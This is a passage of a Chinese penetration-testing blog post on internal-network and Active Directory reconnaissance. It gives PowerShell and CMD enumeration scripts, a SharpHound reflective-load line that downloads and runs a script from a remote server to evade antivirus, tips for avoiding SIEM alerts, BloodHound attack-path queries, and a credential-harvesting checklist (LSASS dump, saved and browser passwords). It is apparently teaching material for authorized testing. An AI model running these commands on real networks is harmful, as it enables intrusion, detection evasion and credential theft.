class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Invoke-Infogather</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>([<span class="built_in">string</span>]<span class="variable">$Dir</span>=<span class="string">&quot;C:\Users\Public\recon&quot;</span>)</span><br><span class="line">    <span class="built_in">New-Item</span> <span class="literal">-ItemType</span> Directory <span class="literal">-Force</span> <span class="literal">-Path</span> <span class="variable">$Dir</span> | <span class="built_in">Out-Null</span></span><br><span class="line">    <span class="variable">$t</span>=<span class="built_in">Get-Date</span> <span class="literal">-Format</span> <span class="string">&quot;yyyyMMdd_HHmmss&quot;</span></span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;[*] 开始信息收集...&quot;</span> <span class="literal">-ForegroundColor</span> Yellow</span><br><span class="line"></span><br><span class="line">    ipconfig /all &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_ip.txt&quot;</span></span><br><span class="line">    route print   &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_route.txt&quot;</span></span><br><span class="line">    arp <span class="literal">-a</span>        &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_arp.txt&quot;</span></span><br><span class="line">    netstat <span class="literal">-ano</span>  &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_netstat.txt&quot;</span></span><br><span class="line">    systeminfo    &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_sys.txt&quot;</span></span><br><span class="line">    wmic qfe get Caption,HotFixID,InstalledOn &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_patch.txt&quot;</span></span><br><span class="line">    whoami /all   &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_whoami.txt&quot;</span></span><br><span class="line">    net user /domain <span class="number">2</span>&gt;<span class="variable">$null</span> &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_domain_users.txt&quot;</span></span><br><span class="line">    net <span class="built_in">group</span> /domain <span class="number">2</span>&gt;<span class="variable">$null</span> &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_domain_groups.txt&quot;</span></span><br><span class="line">    net <span class="built_in">group</span> <span class="string">&quot;Domain Admins&quot;</span> /domain <span class="number">2</span>&gt;<span class="variable">$null</span> &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_da.txt&quot;</span></span><br><span class="line">    net session <span class="number">2</span>&gt;<span class="variable">$null</span> &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_session.txt&quot;</span></span><br><span class="line">    tasklist /v /fo csv &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_proc.csv&quot;</span></span><br><span class="line">    <span class="built_in">sc</span> query state= all &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_svc.txt&quot;</span></span><br><span class="line">    netsh advfirewall show allprofiles &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_fw.txt&quot;</span></span><br><span class="line">    nltest /domain_trusts <span class="number">2</span>&gt;<span class="variable">$null</span> &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_trusts.txt&quot;</span></span><br><span class="line">    nltest /dclist: <span class="number">2</span>&gt;<span class="variable">$null</span> &gt; <span class="string">&quot;<span class="variable">$Dir</span>\<span class="variable">$</span>(<span class="variable">$t</span>)_dc.txt&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;[+] 收集完成: <span class="variable">$Dir</span>&quot;</span> <span class="literal">-ForegroundColor</span> Green</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 执行: Invoke-Infogather</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-CMD-兼容版本（受限环境）"><a href="#5-3-CMD-兼容版本（受限环境）" class="headerlink" title="5.3 CMD 兼容版本（受限环境）"></a>5.3 CMD 兼容版本（受限环境）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">set O=C:\Users\Public\recon &amp; mkdir %O% 2&gt;nul</span><br><span class="line">ipconfig /all &gt; %O%\ip.txt &amp; route print &gt; %O%\route.txt</span><br><span class="line">arp -a &gt; %O%\arp.txt &amp; netstat -ano &gt; %O%\net.txt</span><br><span class="line">systeminfo &gt; %O%\sys.txt &amp; whoami /all &gt; %O%\whoami.txt</span><br><span class="line">net user /domain &gt; %O%\domain_users.txt 2&gt;&amp;1</span><br><span class="line">net group /domain &gt; %O%\domain_groups.txt 2&gt;&amp;1</span><br><span class="line">net group &quot;Domain Admins&quot; /domain &gt; %O%\da.txt 2&gt;&amp;1</span><br><span class="line">net localgroup Administrators &gt; %O%\admin.txt</span><br><span class="line">net session &gt; %O%\session.txt 2&gt;&amp;1</span><br><span class="line">tasklist /svc &gt; %O%\tasks.txt &amp; net share &gt; %O%\shares.txt</span><br><span class="line">set logonserver &gt; %O%\logonserver.txt</span><br><span class="line">echo [+] Complete: %O%</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、BloodHound-数据采集与分析"><a href="#六、BloodHound-数据采集与分析" class="headerlink" title="六、BloodHound 数据采集与分析"></a>六、BloodHound 数据采集与分析</h2><p>BloodHound 利用图论算法分析 AD 环境中的隐藏攻击路径，是域权限分析最强大的工具。</p>
+<h3 id="6-1-SharpHound-采集"><a href="#6-1-SharpHound-采集" class="headerlink" title="6.1 SharpHound 采集"></a>6.1 SharpHound 采集</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反射加载（不落地文件，规避AV）</span></span><br><span class="line"><span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://&lt;server&gt;/SharpHound.ps1&#x27;</span>)</span><br><span class="line"><span class="built_in">Invoke-BloodHound</span> <span class="literal">-CollectionMethod</span> All <span class="literal">-ZipFileName</span> recon.zip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可执行文件方式</span></span><br><span class="line">SharpHound.exe <span class="literal">-c</span> All <span class="literal">--zipfilename</span> recon.zip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键参数:</span></span><br><span class="line"><span class="comment"># -c All           全部采集（Session/LoggedOn/Group/ACL/Trusts/ObjectProps）</span></span><br><span class="line"><span class="comment"># -c Session       仅会话（最轻量，降低检测风险）</span></span><br><span class="line"><span class="comment"># --Throttle 500   限制LDAP请求频率，避免SIEM告警</span></span><br><span class="line"><span class="comment"># --Loop           循环采集，捕获动态会话变化</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-环境启动"><a href="#6-2-环境启动" class="headerlink" title="6.2 环境启动"></a>6.2 环境启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> neo4j console      <span class="comment"># 图数据库 (neo4j:neo4j)</span></span><br><span class="line">bloodhound              <span class="comment"># GUI</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-核心-Cypher-查询"><a href="#6-3-核心-Cypher-查询" class="headerlink" title="6.3 核心 Cypher 查询"></a>6.3 核心 Cypher 查询</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// DA组成员</span><br><span class="line">MATCH (u:User)-[:MemberOf]-&gt;(:Group &#123;name:&#x27;DOMAIN ADMINS@DOMAIN.LOCAL&#x27;&#125;) RETURN u.name</span><br><span class="line"></span><br><span class="line">// 拥有DA会话的计算机 — 横向移动跳板</span><br><span class="line">MATCH (c:Computer)-[:HasSession]-&gt;(u:User)-[:MemberOf]-&gt;(:Group &#123;name:&#x27;DOMAIN ADMINS@DOMAIN.LOCAL&#x27;&#125;)</span><br><span class="line">RETURN c.name, u.name</span><br><span class="line"></span><br><span class="line">// 非约束委派</span><br><span class="line">MATCH (c:Computer &#123;unconstraineddelegation:true&#125;) RETURN c.name</span><br><span class="line"></span><br><span class="line">// Kerberoastable高价值用户</span><br><span class="line">MATCH (u:User &#123;hasspn:true&#125;) WHERE u.name =~ &#x27;(?i).*admin.*&#x27; RETURN u.name, u.serviceprincipalnames</span><br><span class="line"></span><br><span class="line">// 当前用户到DA的最短攻击路径</span><br><span class="line">MATCH p = shortestPath((u:User &#123;name:&#x27;CUR_USER@DOMAIN.LOCAL&#x27;&#125;)-[*1..]-&gt;(:Group &#123;name:&#x27;DOMAIN ADMINS@DOMAIN.LOCAL&#x27;&#125;)) RETURN p</span><br><span class="line"></span><br><span class="line">// 高风险ACL提权路径</span><br><span class="line">MATCH (u)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns]-&gt;(c:Computer) RETURN u.name,type(r),c.name</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-4-SharpHound-注意事项"><a href="#6-4-SharpHound-注意事项" class="headerlink" title="6.4 SharpHound 注意事项"></a>6.4 SharpHound 注意事项</h3><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>频率控制</td>
+<td><code>--Throttle</code> 限制请求间隔，避免SIEM告警</td>
+</tr>
+<tr>
+<td>采集顺序</td>
+<td>先 <code>Session</code>&#x2F;<code>LoggedOn</code> 轻量采集，再扩展</td>
+</tr>
+<tr>
+<td>规避检测</td>
+<td>优先反射加载，避免 exe 落盘</td>
+</tr>
+<tr>
+<td>LDAP签名</td>
+<td>部分环境启用后采集可能失败</td>
+</tr>
+<tr>
+<td>数据安全</td>
+<td>ZIP含敏感信息，传输后立即清理</td>
+</tr>
+</tbody></table>
+<h2 id="七、信息收集流程图"><a href="#七、信息收集流程图" class="headerlink" title="七、信息收集流程图"></a>七、信息收集流程图</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[取得初始立足点]</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[网络基础]  ──  ipconfig / ifconfig, route, arp -a, netsh</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[连接会话]  ──  netstat -ano, net session, 端口服务识别</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[系统信息]  ──  systeminfo, wmic qfe (补丁), tasklist, 防病毒识别</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[用户权限]  ──  whoami /all, 本地组管理员, 保存凭据检查</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[DNS/DHCP]  ──  nslookup, ipconfig /displaydns, DHCP 定位</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[域环境]    ──  net group /domain, net user /domain, nltest dclist, 域信任</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[AD 查询]   ──  ADSI / Get-ADUser, Get-ADComputer, SPN 枚举</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[BloodHound]──  SharpHound 采集 → Neo4j → 攻击路径分析</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">[横向移动规划]── 评估攻击路径 → 确定跳板机 → 执行横向</span><br></pre></td></tr></table></figure>
+
+<h2 id="八、完整检查清单"><a href="#八、完整检查清单" class="headerlink" title="八、完整检查清单"></a>八、完整检查清单</h2><h3 id="主机层面"><a href="#主机层面" class="headerlink" title="主机层面"></a>主机层面</h3><ul>
+<li><input disabled="" type="checkbox"> <code>ipconfig /all</code> — IP、DNS、DHCP 服务器</li>
+<li><input disabled="" type="checkbox"> <code>route print</code> — 路由表，识别可达网段</li>
+<li><input disabled="" type="checkbox"> <code>arp -a</code> — 同网段主机发现</li>
+<li><input disabled="" type="checkbox"> <code>netstat -ano</code> — 端口&#x2F;连接&#x2F;PID</li>
+<li><input disabled="" type="checkbox"> <code>systeminfo</code> — OS 版本、补丁级别、域归属</li>
+<li><input disabled="" type="checkbox"> <code>wmic qfe list</code> — 完整补丁列表（CVE 对照）</li>
+<li><input disabled="" type="checkbox"> <code>tasklist /svc</code> — 进程+服务，识别 EDR&#x2F;AV</li>
+<li><input disabled="" type="checkbox"> <code>wmic product get name,version</code> — 软件版本 CVE 检查</li>
+<li><input disabled="" type="checkbox"> <code>net share</code> — 共享文件夹</li>
+<li><input disabled="" type="checkbox"> <code>whoami /all</code> — Token 特权与组成员</li>
+<li><input disabled="" type="checkbox"> <code>cmdkey /list</code> — 保存的凭据</li>
+<li><input disabled="" type="checkbox"> <code>vaultcmd /listcreds</code> — Windows 凭据管理器</li>
+</ul>
+<h3 id="域层面"><a href="#域层面" class="headerlink" title="域层面"></a>域层面</h3><ul>
+<li><input disabled="" type="checkbox"> <code>net config workstation</code> — 确认域成员身份</li>
+<li><input disabled="" type="checkbox"> <code>set logonserver</code> — 当前认证 DC</li>
+<li><input disabled="" type="checkbox"> <code>nltest /dclist:&lt;domain&gt;</code> — 全部域控制器</li>
+<li><input disabled="" type="checkbox"> <code>nltest /domain_trusts</code> — 信任关系</li>
+<li><input disabled="" type="checkbox"> <code>net user /domain</code> — 域用户列表</li>
+<li><input disabled="" type="checkbox"> <code>net group /domain</code> — 域组列表</li>
+<li><input disabled="" type="checkbox"> <code>net group &quot;Domain Admins&quot; /domain</code> — DA 成员</li>
+<li><input disabled="" type="checkbox"> <code>net group &quot;Enterprise Admins&quot; /domain</code> — EA 成员</li>
+<li><input disabled="" type="checkbox"> <code>net group &quot;Domain Controllers&quot; /domain</code> — DC 计算机</li>
+<li><input disabled="" type="checkbox"> <code>net localgroup Administrators</code> — 本机管理员</li>
+<li><input disabled="" type="checkbox"> <code>net session</code> — 入站 SMB 会话</li>
+</ul>
+<h3 id="深度枚举与凭据收集"><a href="#深度枚举与凭据收集" class="headerlink" title="深度枚举与凭据收集"></a>深度枚举与凭据收集</h3><ul>
+<li><input disabled="" type="checkbox"> ADSI &#x2F; Get-ADUser — 用户属性（Description 字段常含密码线索）</li>
+<li><input disabled="" type="checkbox"> SPN 枚举 — Kerberoasting 候选（HTTP, MSSQL, TERMSRV）</li>
+<li><input disabled="" type="checkbox"> SharpHound 全量采集 → BloodHound 攻击路径分析</li>
+<li><input disabled="" type="checkbox"> AS-REP Roasting 候选用户检查</li>
+<li><input disabled="" type="checkbox"> LSASS dump — 内存凭据提取</li>
+<li><input disabled="" type="checkbox"> 配置文件 — <code>web.config</code>、<code>Unattend.xml</code>、GPP cpassword</li>
+<li><input disabled="" type="checkbox"> PowerShell 历史 — <code>ConsoleHost_history.txt</code></li>
+<li><input disabled="" type="checkbox"> RDP 连接历史 — 注册表查询</li>
+<li><input disabled="" type="checkbox"> 浏览器密码 — Chrome, Edge, Firefox</li>
+</ul>
+<h3 id="安全产品识别"><a href="#安全产品识别" class="headerlink" title="安全产品识别"></a>安全产品识别</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Process</span> | ? &#123; <span class="variable">$_</span>.Name <span class="operator">-match</span> <span class="string">&quot;MsMpEng|csfalcon|SentinelAgent|cbdefense|sophos|trend&quot;</span> &#125;</span><br><span class="line"><span class="built_in">Get-Process</span> | ? &#123; <span class="variable">$_</span>.ProcessName <span class="operator">-eq</span> <span class="string">&quot;Sysmon&quot;</span> &#125;</span><br><span class="line"><span class="built_in">Get-ItemProperty</span> <span class="string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="九、总结"><a href="#九、总结" class="headerlink" title="九、总结"></a>九、总结</h2><p>内网信息收集遵循循序渐进、由浅入深的原则：</p>
+<ol>
+<li><strong>先轻后重</strong> — 优先低风险操作（本地配置、ARP 表），避免过早触发告警。</li>
+<li><strong>横向关联</strong> — 单条信息有限，组合后可揭示攻击路径（ARP + net session → 管理员工作站定位）。</li>
+<li><strong>工具整合</strong> — 手工命令初侦，BloodHound 系统化 AD 分析，二者互补。</li>
+<li><strong>动态持续</strong> — 域环境动态变化，定期重新采集捕获新增会话与权限关系。</li>
+<li><strong>痕迹管理</strong> — 授权测试结束后清理落地文件与临时目录。<br>掌握本文方法论后，渗透测试人员可在有限时间内高效绘制目标网络全貌，为横向移动与权限提升奠定坚实基础。</li>
+</ol>
+<hr>
+<blockquote>
+<p><strong>Disclaimer:</strong> 本文所有内容仅供安全研究与授权测试参考。未经系统所有者书面授权，禁止对任何系统进行扫描、渗透或数据采集。使用者须自行承担一切法律后果。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"># 信息收集</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Windows-privesc-kernel-driver/" rel="prev" title="Windows提权：内核与驱动漏洞">
+                  <i class="fa fa-angle-left"></i> Windows提权：内核与驱动漏洞
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Windows-privesc-methodology/" rel="next" title="Windows 提权方法论与工具链">
+                  Windows 提权方法论与工具链 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
